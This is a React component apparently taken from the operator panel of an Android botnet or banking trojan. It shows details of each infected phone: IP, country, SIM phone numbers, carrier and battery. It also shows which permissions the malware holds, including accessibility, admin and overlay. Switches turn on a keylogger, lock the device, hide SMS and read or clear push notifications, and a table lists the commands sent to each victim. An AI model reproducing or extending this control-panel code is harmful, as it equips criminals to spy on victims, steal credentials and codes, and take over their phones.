import React, {useLayoutEffect, useState} from "react";
import {BotModalProps} from "../../../Model/Modal";
import {Button, Modal, Pagination, Space, Switch, Table, Tooltip} from "antd";
import {
    AndroidOutlined,
    CheckCircleOutlined,
    ClockCircleOutlined,
    CloseCircleFilled,
    PhoneOutlined,
    SignalFilled,
} from "@ant-design/icons";

import {
    AccountBoxIcon,
    AdminPanelSettingsIcon,
    BatteryIcon,
    KeyboardIconMD,
    MarkEmailReadIcon,
    MarkEmailUnreadIcon,
    OfflineBoltIcon,
    SettingsAccessibilityIcon,
    SimCardIcon,
    TableViewIcon,
    VisibilityIcon,
} from "../../Misc/CustomIcons";
import {useDispatch, useSelector} from "react-redux";
import {getBotCommandsList} from "../../../Store/BotCommands/Actions";
import {BotCommand} from "../../../Model/BotCommand";
import {AppState} from "../../../Store/RootReducer";

import {updateBotSettingsValue} from "../../../Store/Bots/Actions";

const permissionActiveColor = {fill: "#4aac16"};

const BotInfo: React.FC<BotModalProps> = (props: BotModalProps) => {
    const bot = props.bot;
    const permissions = bot.permissions;

    const closeModal = () => {
        props.setVisible(false);
    };

    const botCommandsReducer = useSelector((state: AppState) => state.botCommands);

    const dispatch = useDispatch();

    const [currentPageNumber, setCurrentPageNumber] = useState(1);

    useLayoutEffect(() => {
        if (props.visible) {
            dispatch(getBotCommandsList(props.bot.id));
        }
        setCurrentPageNumber(1);
    }, [dispatch, props.bot.id, props.visible]);


    const isLoaded = botCommandsReducer.isLoaded && botCommandsReducer.botId === props.bot.id &&
        currentPageNumber === botCommandsReducer.page;

    const paginationHandle = (pageNumber: number) => {
        setCurrentPageNumber(pageNumber);
        dispatch(getBotCommandsList(props.bot.id, pageNumber));
    };

    const onChangeSettings = (type: string, value: boolean) => {
        dispatch(updateBotSettingsValue(props.bot.id, type, value));
    };

    const columns = [
        {
            title: "Command",
            dataIndex: "command",
            key: "command",
            width: 250,
            render: (text: string, command: BotCommand) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>Command</b>
                    </div>
                    <div className="table-col-item">
                        <Space size={5} align="center" style={{fontSize: 12}}>
                            {command.is_processed ?
                                <CheckCircleOutlined style={{fontSize: 15, color: "#4aac16"}} /> :
                                <ClockCircleOutlined style={{fontSize: 15, color: "#777"}} />
                            }
                            <span className={command.is_processed ? "command-span command-processed" : "command-span"}>{command.command.command}</span>
                        </Space>
                    </div>
                </div>
            ),
        },
        {
            title: "Payload",
            dataIndex: "payload",
            key: "payload",
            width: 300,
            render: (text: string, command: BotCommand) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>Payload</b>
                    </div>
                    <div className="table-col-item">
                        <div className="code">{JSON.stringify(command.command.payload, null, 2)}</div>
                    </div>
                </div>
            ),
        },
        {
            title: "Date",
            dataIndex: "date",
            key: "date",
            width: 250,
            render: (text: string, command: BotCommand) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>Date</b>
                    </div>
                    <div className="table-col-item" style={{fontSize: 12}}>
                        {command.created_at ? command.created_at : "-"}
                    </div>
                </div>
            ),
        },
    ];

    return (
        <Modal
            visible={props.visible}
            onCancel={closeModal}
            title="Bot info"
            width={650}
            destroyOnClose
            footer={[
                <Button type="primary" onClick={closeModal} key={1}>
                    Close
                </Button>,
            ]}
        >
            <div className="botinfo-list">
                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <b>Bot ID:</b>
                    </span>
                    <span className="botinfo-list-item-span">
                        <a href="/" onClick={(e) => e.preventDefault()}><b>{bot.id}</b></a>
                    </span>
                </div>
                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <b>OS:</b>
                    </span>
                    <span className="botinfo-list-item-span">
                        <AndroidOutlined style={{color: "#4aac16"}} /> Android {bot.metadata.android}
                    </span>
                </div>
                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <b>Model:</b>
                    </span>
                    <span className="botinfo-list-item-span">
                        {bot.metadata.model}
                    </span>
                </div>
                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <b>IP:</b>
                    </span>
                    <span className="botinfo-list-item-span">
                        <div>{bot.ip}</div>
                        <Space size={5}>
                            <img
                                src={`https://purecatamphetamine.github.io/country-flag-icons/3x2/${bot.country_code.toUpperCase()}.svg`}
                                alt={bot.country}
                                width={16}
                            />
                            <span>{bot.country}</span>
                        </Space>
                    </span>
                </div>
                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <b>Battery:</b>
                    </span>
                    <span className="botinfo-list-item-span">
                        <BatteryIcon/> {bot.metadata.battery_level}%
                    </span>
                </div>
                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <b>Permissions:</b>
                    </span>
                    <span className="botinfo-list-item-span permissions">
                        <Space size={5}>
                            <Tooltip title="On screen" placement="bottom" destroyTooltipOnHide>
                                <div>
                                    {permissions.screen ? <VisibilityIcon style={permissionActiveColor}/> : <VisibilityIcon/>}
                                </div>
                            </Tooltip>

                            <Tooltip title="Accessibility" placement="bottom" destroyTooltipOnHide>
                                <div>
                                    {permissions.accessibility ? <SettingsAccessibilityIcon style={permissionActiveColor}/> : <SettingsAccessibilityIcon/>}
                                </div>
                            </Tooltip>

                            <Tooltip title="Contacts" placement="bottom" destroyTooltipOnHide>
                                <div>
                                    {props.bot.set_contact_list ? <AccountBoxIcon style={permissionActiveColor}/> : <AccountBoxIcon />}
                                </div>
                            </Tooltip>

                            <Tooltip title="On top" placement="bottom" destroyTooltipOnHide>
                                <div>
                                    {props.bot.set_windows_fake ? <TableViewIcon style={permissionActiveColor}/> : <TableViewIcon />}
                                </div>
                            </Tooltip>

                            <Tooltip title="Module loaded" placement="bottom" destroyTooltipOnHide>
                                <div>
                                    {permissions.isKeyguardLocked ? <OfflineBoltIcon style={permissionActiveColor}/> : <OfflineBoltIcon/>}
                                </div>
                            </Tooltip>

                            <Tooltip title="Admin" placement="bottom" destroyTooltipOnHide>
                                <div>
                                    {permissions.admin ? <AdminPanelSettingsIcon style={permissionActiveColor}/> : <AdminPanelSettingsIcon />}
                                </div>
                            </Tooltip>

                            <Tooltip title="SMS list" placement="bottom" destroyTooltipOnHide>
                                <div>
                                    {permissions.is_dozemode ? <MarkEmailReadIcon style={permissionActiveColor}/> : <MarkEmailReadIcon />}
                                </div>
                            </Tooltip>

                            <Tooltip title="Hide SMS" placement="bottom" destroyTooltipOnHide>
                                <div>
                                    {props.bot.settings.hideSMS ? <MarkEmailUnreadIcon style={permissionActiveColor}/> : <MarkEmailUnreadIcon />}
                                </div>
                            </Tooltip>

                            <Tooltip title="Keylogger" placement="bottom" destroyTooltipOnHide>
                                <div>
                                    {props.bot.settings.keylogger ? <KeyboardIconMD style={permissionActiveColor}/> : <KeyboardIconMD />}
                                </div>
                            </Tooltip>
                        </Space>
                    </span>
                </div>

                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <Space size={10}>
                            <Switch size="small" checked={bot.settings.keylogger} onChange={(value: boolean) => onChangeSettings("keylogger", value)}/>
                            Keylogger
                        </Space>
                    </span>
                    <span className="botinfo-list-item-span">
                        <Space size={10}>
                            <Switch size="small" checked={bot.settings.lockDevice} onChange={(value: boolean) => onChangeSettings("lockDevice", value)}/>
                            Lock device
                        </Space>
                    </span>
                </div>
                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <Space size={10}>
                            <Switch size="small" checked={bot.settings.offSound} onChange={(value: boolean) => onChangeSettings("offSound", value)}/>
                            Off sound
                        </Space>
                    </span>
                    <span className="botinfo-list-item-span">
                        <Space size={10}>
                            <Switch size="small" checked={bot.settings.hideSMS} onChange={(value: boolean) => onChangeSettings("hideSMS", value)}/>
                            Hide SMS
                        </Space>
                    </span>
                </div>
                <div className="botinfo-list-item">
                    <span className="botinfo-list-item-span">
                        <Space size={10}>
                            <Switch size="small" checked={bot.settings.readPush} onChange={(value: boolean) => onChangeSettings("readPush", value)}/>
                            Read push
                        </Space>
                    </span>
                    <span className="botinfo-list-item-span">
                        <Space size={10}>
                            <Switch size="small" checked={bot.settings.clearPush} onChange={(value: boolean) => onChangeSettings("clearPush", value)}/>
                            Clear push
                        </Space>
                    </span>
                </div>
            </div>

            <div className="botinfo-info">
                <table className="botinfo-table">
                    <caption>SIM Cards</caption>
                    <thead>
                        <tr>
                            <th><SimCardIcon/> Sim #1</th>
                            <th className={!bot.sim_data.isDualSim ? "disabled" : ""}><SimCardIcon/> Sim #2</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>
                                <div className="botinfo-tel"><PhoneOutlined/> {bot.sim_data.phone_number}</div>
                                <div className="botinfo-provider"><SignalFilled/> {bot.sim_data.operator}</div>
                            </td>
                            {bot.sim_data.isDualSim ? (
                                <td>
                                    <div className="botinfo-tel"><PhoneOutlined/> {bot.sim_data.phone_number1}</div>
                                    <div className="botinfo-provider"><SignalFilled/> {bot.sim_data.operator1}</div>
                                </td>
                            ) : (
                                <td>
                                    <CloseCircleFilled/> Not plugged
                                </td>
                            )}
                        </tr>
                    </tbody>
                </table>
            </div>

            <div className="botinfo-info">
                <Table
                    title={() => "Command history"}
                    pagination={false}
                    columns={columns}
                    dataSource={botCommandsReducer.commands}
                    loading={!isLoaded}
                    size="small"
                    rowKey={"id"}
                    // tableLayout="fixed"
                />
            </div>

            {/* eto? где  событие? редуктор написан, используй. */}
            <Pagination
                total={botCommandsReducer.total}
                defaultPageSize={botCommandsReducer.per_page}
                current={botCommandsReducer.page}
                onChange={paginationHandle}
                size="small"
            />
        </Modal>
    );
};

export default BotInfo;
